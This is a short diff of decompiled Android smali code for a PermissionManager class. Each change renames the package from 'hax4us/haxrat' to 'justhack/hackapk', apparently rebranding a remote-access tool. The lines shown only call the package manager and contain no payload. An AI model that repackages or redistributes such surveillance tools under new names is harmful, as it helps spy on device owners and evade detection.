@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/PermissionManager;
+.class public Lcom/justhack/hackapk/PermissionManager;
 .super Ljava/lang/Object;
 .source "PermissionManager.java"
 
@@ -25,7 +25,7 @@
     .line 28
     move-object v0, p0
 
-    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v3, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
@@ -33,7 +33,7 @@
 
     move-object v4, v0
 
-    sget-object v5, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v5, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v5}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
 
@@ -95,13 +95,13 @@
     move-object v2, v6
 
     .line 17
-    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v6, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
     move-result-object v6
 
-    sget-object v7, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;
+    sget-object v7, Lcom/justhack/hackapk/ConnectionManager;->context:Landroid/content/Context;
 
     invoke-virtual {v7}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
 
